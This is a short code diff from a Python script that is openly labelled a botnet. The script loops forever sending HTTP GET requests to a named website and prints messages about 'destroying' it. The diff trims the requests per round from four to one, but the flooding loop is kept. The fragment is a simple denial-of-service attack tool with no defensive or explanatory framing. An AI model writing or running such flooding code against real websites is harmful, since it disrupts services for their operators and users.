@@ -49,8 +49,5 @@ print(r.json())
 
 while True:
     response = requests.get(url="http://botnet.medal-media.com")
-    response1 = requests.get(url="http://botnet.medal-media.com")
-    response2 = requests.get(url="http://botnet.medal-media.com")
-    response3 = requests.get(url="http://botnet.medal-media.com")
     count = count + 1
     print("HazeleyBotnet destroying website in round " + str(count))
